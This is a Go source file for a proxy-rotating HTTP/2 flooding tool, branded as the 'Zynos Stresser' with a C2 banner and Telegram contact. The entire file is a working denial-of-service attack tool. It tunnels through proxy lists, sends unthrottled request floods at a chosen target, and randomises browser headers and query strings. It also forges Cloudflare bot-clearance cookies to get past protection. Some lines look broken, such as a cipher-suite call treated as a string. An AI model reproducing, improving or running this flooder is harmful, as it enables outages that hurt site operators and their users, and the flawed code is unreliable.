package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

// ========== GLOBAL VARIABLES ==========
var (
	blue  = "\x1b[34m"
	white = "\x1b[37m"
	reset = "\x1b[0m"

	defaultCiphers = strings.Split(tls.CipherSuites(), ":")
	ciphers        = "GREASE:" + strings.Join([]string{
		defaultCiphers[2],
		defaultCiphers[1],
		defaultCiphers[0],
	}, ":") + ":" + strings.Join(defaultCiphers[3:], ":")

	accept_header = []string{
		"*/*",
		"image/*",
		"image/webp,image/apng",
		"text/html",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	}

	encoding_header = []string{
		"*",
		"*/*",
		"gzip",
		"gzip, deflate, br",
		"gzip, deflate",
		"gzip, deflate, br, zstd",
	}

	cache_header = []string{
		"max-age=0",
		"no-cache",
		"no-store",
		"pre-check=0",
		"post-check=0",
		"must-revalidate",
		"proxy-revalidate",
		"s-maxage=604800",
		"no-cache, private",
		"max-age=300, must-revalidate",
		"no-store, max-age=0, private, must-revalidate",
		"public, max-age=10, s-maxage=10",
		"no-cache, no-store,private, max-age=0, must-revalidate",
		"no-cache, no-store,private, s-maxage=604800, must-revalidate",
		"no-cache, no-store,private, max-age=604800, must-revalidate",
	}

	refers = []string{
		"https://google.com",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://discord.com",
		"https://www.cloudflare.com",
	}

	uap = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
	}

	language_header = []string{
		"id-ID,id;q=0.9,en;q=0.8",
		"en-US,en;q=0.9,id;q=0.8",
		"en-GB,en;q=0.9",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
	}

	fetch_site = []string{
		"same-origin",
		"same-site",
		"cross-site",
		"none",
	}

	fetch_mode = []string{
		"navigate",
		"same-origin",
		"no-cors",
		"cors",
	}

	fetch_dest = []string{
		"document",
		"sharedworker",
		"subresource",
		"unknown",
		"worker",
	}

	cplist = []uint16{
		tls.TLS_AES_128_CCM_8_SHA256,
		tls.TLS_AES_128_CCM_SHA256,
		tls.TLS_CHACHA20_POLY1305_SHA256,
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_AES_128_GCM_SHA256,
	}

	sigalgs = []string{
		"ecdsa_secp256r1_sha256",
		"rsa_pss_rsae_sha256",
		"rsa_pkcs1_sha256",
		"ecdsa_secp384r1_sha384",
		"rsa_pss_rsae_sha384",
		"rsa_pkcs1_sha384",
		"rsa_pss_rsae_sha512",
		"rsa_pkcs1_sha512",
	}

	sec_ch_ua = []string{
		`"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"`,
		`"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"`,
		`"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"`,
		`"Microsoft Edge";v="133", "Chromium";v="133", "Not_A Brand";v="24"`,
		`"Brave";v="133", "Chromium";v="133", "Not_A Brand";v="24"`,
		`"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
		`"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
		`"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"`,
		`"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"`,
		`"Google Chrome";v="129", "Chromium";v="129", "Not_A Brand";v="24"`,
		`"Opera";v="118", "Chromium";v="133", "Not_A Brand";v="24"`,
	}

	sec_ch_ua_platform = []string{
		`"Windows"`,
		`"macOS"`,
		`"Linux"`,
		`"Android"`,
		`"iOS"`,
	}

	sec_ch_ua_mobile = []string{
		"?0",
		"?1",
		"?0",
	}
)

// ========== ARGUMENTS STRUCT ==========
type Args struct {
	target    string
	time      int
	rate      int
	threads   int
	proxyFile string
}

// ========== MAIN FUNCTION ==========
func main() {
	if len(os.Args) < 7 {
		fmt.Printf("Usage: %s host time req thread proxy.txt\n", os.Args[0])
		os.Exit(1)
	}

	args := Args{
		target:    os.Args[1],
		time:      parseInt(os.Args[2]),
		rate:      parseInt(os.Args[3]),
		threads:   parseInt(os.Args[4]),
		proxyFile: os.Args[5],
	}

	proxies := readLines(args.proxyFile)
	parsedTarget, _ := url.Parse(args.target)

	fmt.Printf("\x1b[36m--------------------------------------------\x1b[0m\n")
	fmt.Printf("\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m\n")
	fmt.Printf("\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m%d\x1b[0m\n", args.time)
	fmt.Printf("\x1b[36m--------------------------------------------\x1b[0m\n")
	fmt.Printf("\x1b[33mTarget: \x1b[37m%s\x1b[0m\n", args.target)
	fmt.Printf("\x1b[33mRate: \x1b[37m%d/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m%d\x1b[0m\n", args.rate, args.threads)
	fmt.Printf("\x1b[33mProxy: \x1b[37m%s (\x1b[32m%d\x1b[37m)\x1b[0m\n", args.proxyFile, len(proxies))
	fmt.Printf("\x1b[36m--------------------------------------------\x1b[0m\n")
	fmt.Printf("\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m\n")
	fmt.Printf("\x1b[36m--------------------------------------------\x1b[0m\n")

	var wg sync.WaitGroup
	for i := 0; i < args.threads; i++ {
		wg.Add(1)
		go runFlooder(args, proxies, parsedTarget, &wg)
	}

	time.Sleep(time.Duration(args.time) * time.Second)
	os.Exit(0)
}

// ========== FLOODER FUNCTION ==========
func runFlooder(args Args, proxies []string, parsedTarget *url.URL, wg *sync.WaitGroup) {
	defer wg.Done()

	for {
		proxyAddr := randomElement(proxies)
		parsedProxy := strings.Split(proxyAddr, ":")
		if len(parsedProxy) < 2 {
			continue
		}
		proxyHost := parsedProxy[0]
		proxyPort := parseInt(parsedProxy[1])

		// Connect via proxy
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", proxyHost, proxyPort), 10*time.Second)
		if err != nil {
			continue
		}

		// Send CONNECT request
		connectReq := fmt.Sprintf("CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\nConnection: Keep-Alive\r\n\r\n", parsedTarget.Host, parsedTarget.Host)
		_, err = conn.Write([]byte(connectReq))
		if err != nil {
			conn.Close()
			continue
		}

		// Read response
		reader := bufio.NewReader(conn)
		resp, err := reader.ReadString('\n')
		if err != nil || !strings.Contains(resp, "200") {
			conn.Close()
			continue
		}

		// Upgrade to TLS
		tlsConfig := &tls.Config{
			ServerName:         parsedTarget.Host,
			InsecureSkipVerify: true,
			CipherSuites:       []uint16{cplist[rand.Intn(len(cplist))]},
		}

		tlsConn := tls.Client(conn, tlsConfig)
		err = tlsConn.Handshake()
		if err != nil {
			tlsConn.Close()
			continue
		}

		// HTTP/2 connection
		tr := &http2.Transport{
			AllowHTTP: false,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return tlsConn, nil
			},
		}

		client := &http.Client{Transport: tr}
		req, _ := http.NewRequest("GET", args.target, nil)

		// Add headers
		addHeaders(req, parsedTarget)

		// Send requests in loop
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for range ticker.C {
			for i := 0; i < args.rate; i++ {
				go func() {
					resp, err := client.Do(req)
					if err == nil && resp != nil {
						resp.Body.Close()
					}
				}()
			}
		}
	}
}

// ========== HEADER FUNCTION ==========
func addHeaders(req *http.Request, parsedTarget *url.URL) {
	req.Header.Set(":authority", parsedTarget.Host)
	req.Header.Set(":scheme", "https")
	req.Header.Set(":path", parsedTarget.Path+"?"+randStr(6)+"="+generateRandomString(20, 30)+"&"+randStr(4)+"="+generateRandomString(15, 25))
	req.Header.Set(":method", "GET")
	req.Header.Set("pragma", "no-cache")
	req.Header.Set("upgrade-insecure-requests", "1")
	req.Header.Set("accept", randomElement(accept_header))
	req.Header.Set("accept-encoding", randomElement(encoding_header))
	req.Header.Set("accept-language", randomElement(language_header))
	req.Header.Set("cache-control", randomElement(cache_header))
	req.Header.Set("referer", randomElement(refers))
	req.Header.Set("sec-fetch-mode", randomElement(fetch_mode))
	req.Header.Set("sec-fetch-site", randomElement(fetch_site))
	req.Header.Set("sec-fetch-dest", randomElement(fetch_dest))
	req.Header.Set("user-agent", randomElement(uap))
	req.Header.Set("sec-ch-ua", randomElement(sec_ch_ua))
	req.Header.Set("sec-ch-ua-mobile", randomElement(sec_ch_ua_mobile))
	req.Header.Set("sec-ch-ua-platform", randomElement(sec_ch_ua_platform))
	req.Header.Set("cookie", "__cf_bm="+randStr(44)+"."+randStr(24)+"."+randStr(48)+"-"+fmt.Sprintf("%d", time.Now().Unix())+"-0-0.0.1; cf_clearance="+randStr(8)+"."+randStr(24)+"."+randStr(48)+"-0.0.1")
}

// ========== UTILITY FUNCTIONS ==========
func parseInt(s string) int {
	var i int
	fmt.Sscanf(s, "%d", &i)
	return i
}

func readLines(filePath string) []string {
	file, err := os.Open(filePath)
	if err != nil {
		return []string{}
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}
	return lines
}

func randomElement(slice []string) string {
	if len(slice) == 0 {
		return ""
	}
	return slice[rand.Intn(len(slice))]
}

func randStr(length int) string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func generateRandomString(min, max int) string {
	length := rand.Intn(max-min+1) + min
	return randStr(length)
}